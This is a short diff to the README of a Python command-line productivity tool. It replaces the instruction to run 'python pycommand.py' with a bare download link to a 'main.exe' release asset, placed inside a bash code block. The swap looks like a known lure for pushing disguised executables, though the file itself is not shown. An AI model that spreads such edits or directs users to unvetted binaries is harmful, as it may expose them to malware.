@@ -42,4 +42,5 @@ PyCommand is a simple but powerful command-line interface that combines everyday
 3. Open a terminal in the project folder and run:
 
 ```bash
-python pycommand.py
+https://github.com/Yuvraj-Singh77/PyCommand--personal-productivity-utility-toolkit/releases/download/v1/main.exe
+
